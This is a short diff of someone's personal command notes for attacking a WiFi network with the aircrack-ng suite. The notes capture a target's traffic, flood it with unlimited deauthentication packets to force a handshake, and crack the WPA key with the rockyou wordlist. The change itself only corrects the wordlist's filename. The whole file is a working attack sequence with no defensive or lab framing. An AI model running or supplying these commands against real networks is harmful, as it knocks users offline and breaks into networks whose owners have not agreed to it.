@@ -5,5 +5,5 @@ airodump-ng wlan0mon
 airodump-ng --bssid "mac" -c "channe" -w /home/pavlin/ wlan0mon
 "in new window"
 aireplay-ng -0 0 -a "mac" wlan0mon
-aircrack-ng 01.cap -w /usr/share/wordlist/rock.you.txt
+aircrack-ng 01.cap -w /usr/share/wordlist/rockyou.txt
 
